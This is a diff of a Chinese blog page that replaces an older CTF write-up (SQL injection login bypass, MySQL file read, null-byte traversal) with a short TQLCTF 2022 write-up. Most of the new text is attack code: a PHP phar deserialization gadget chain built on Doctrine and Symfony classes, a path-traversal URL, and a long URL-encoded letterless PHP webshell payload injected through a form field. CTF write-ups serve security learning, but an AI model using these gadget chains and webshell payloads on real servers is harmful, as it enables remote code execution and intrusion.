@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>某入群题2 |  </title>
+  <title>tqlctf |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="某入群题2 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="tqlctf |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,8 +25,8 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="某入群题2"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/Y59x961oO/"/>
+    <meta property="og:description" content="tqlctf"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/mW82PLQwt/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -82,13 +82,11 @@
           	 
             <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
-            
         </span>
-            <h1>某入群题2</h1>
+            <h1>tqlctf</h1>
             <span class="meta">
             	Posted on
-              2020-04-11，2 min read
+              2022-02-20，8 min read
             </span>
           </div>
         </div>
@@ -101,56 +99,68 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <p>就一个登陆界面。目录也没扫出来。无源码泄露。<br>
-burp抓个包试试注入<br>
-输入单引号 返回请停止输入危险字符/单词!<br>
-用双引号试了下。没反应。应该就是单引号的注入</p>
-<!-- more -->
-<p>猜测后台语句为</p>
-<pre><code>select token from user where username='' and password=''
+          <p>简单记录下。</p>
+<pre><code>&lt;?php
+namespace Doctrine\Common\Cache\Psr6{
+    class CacheAdapter{
+        private $deferredItems;
+        public function __construct($deferredItems){
+            $this-&gt;deferredItems=$deferredItems;
+        }
+    }
+}
+
+namespace Symfony\Component\Messenger\Bridge\Redis\Transport{
+    class RedisProxy{
+        private $redis;
+        private $initializer;
+        private $ready;
+        public function __construct($initializer){
+            $this-&gt;ready=false;
+            $this-&gt;redis=&quot;1&quot;;
+            $this-&gt;initializer=$initializer;
+        }
+    }
+}
+namespace Symfony\Component\Console\Helper{
+    class Dumper{
+        private $handler=&quot;phpinfo&quot;;
+    }
+}
+namespace {
+
+    use Doctrine\Common\Cache\Psr6\CacheAdapter;
+    use Symfony\Component\Console\Helper\Dumper;
+    use Symfony\Component\Messenger\Bridge\Redis\Transport\RedisProxy;
+    $phar = new \Phar(&quot;phar.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+    $phar-&gt;setMetadata(new CacheAdapter([&quot;123&quot;=&gt;new RedisProxy(new Dumper())]));
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;tesat&quot;);
+    $phar-&gt;stopBuffering();
+
+}
 </code></pre>
-<p>我们可以通过\转义。<br>
-<img src="https://guokeya.github.io/post-images/1586590553983.png" alt="" loading="lazy"><br>
-可以看到。用户确实是绕过去了。但是还要审核密保问题<br>
-sql里可以用with group来构造返回结果<br>
-group by token with rollup having token is null<br>
-<img src="https://guokeya.github.io/post-images/1586590675601.png" alt="" loading="lazy"><br>
-进入后台。有写马的功能。有查看马的功能。有个数据备份。<br>
-数据备份。一看就想到mysql任意文件读取。<br>
-顺势读取/etc/passwd发现mysql用户有bash</p>
-<pre><code>/home/mysql/.bash_history
-无果
-/etc/nginx.conf
-得到配置文件
-/usr/share/nginx/html/login.php
-无果
-/etc/hosts
-没发现什么东西。
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1645363095376.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1645363124528.png" alt="" loading="lazy"></figure>
+<p>必须是caching_sha2_password连接。会有缓存。flush之后就没了<br>
+然后再发送phar即可触发反序列化<br>
+phar。得用dumpfile。。二进制文件<br>
+outfile会丢字节</p>
+<p>/get_pic.php?image=../../../../../../../var/www/html//sandbox/16906266ba0d679522301631018473cc.php</p>
+<p>读各种源码</p>
+<p>对照生成的sandbox.php和可控点。有三个可控点。</p>
+<figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/2022220/1645363668378-a6567b72-826b-4211-9374-a3108bcedd95.png" alt="image-20220220212740430" loading="lazy"></figure>
+<p>第一个可控点<code>/*</code></p>
+<p>第二个可控点<code>*/;无数字字母webshell;/*</code></p>
+<pre><code>user=guo/*&amp;pass=guoke2&amp;website=ccc&amp;punctuation=%2a%2f%29%3b%24%5f%3d%27%27%3b%24%5f%5b%2b%24%5f%5d%2b%2b%3b%24%5f%3d%24%5f%2e%27%27%3b%24%5f%5f%3d%24%5f%5b%2b%27%27%5d%3b%24%5f%3d%24%5f%5f%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2a
 </code></pre>
-<p>大佬提示。目录遍历。PHP版本。一脸懵逼<br>
-在系统信息出。发现PHP版本5.2.17<br>
-去看看shell。都是假的。<br>
-<img src="https://guokeya.github.io/post-images/1586591513303.png" alt="" loading="lazy"><br>
-访问123会传入两个文件。</p>
-<pre><code>一个addshell.php?name=123
-还有json.php?dt=alldata&amp;name=123&amp;page=123&amp;limit=16
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1586591643739.png" alt="" loading="lazy"></figure>
-<p>我添加一个123类。并且添加123.php<br>
-那么访问的是data/123/webshell/2020-4-11.txt<br>
-123是可变的。但是后面会加上webshell。<br>
-猜测后台代码是</p>
-<pre><code>scandir($_GET['page'].'/webshell/')
-</code></pre>
-<p>那么可以用00截断。并且PHP版本小于5.3.4<br>
-<img src="https://guokeya.github.io/post-images/1586591800822.png" alt="" loading="lazy"><br>
-遍历。得到Flag。然后mysql任意文件读取</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/JVOBLI1rh/">
+            <a href="https://guokeya.github.io/post/Tqvzh3DoQ/">
               <span class="post-title">
-                js原型参数污染&rarr;
+                rwctf 两个web&rarr;
               </span>
             </a>
           </p>
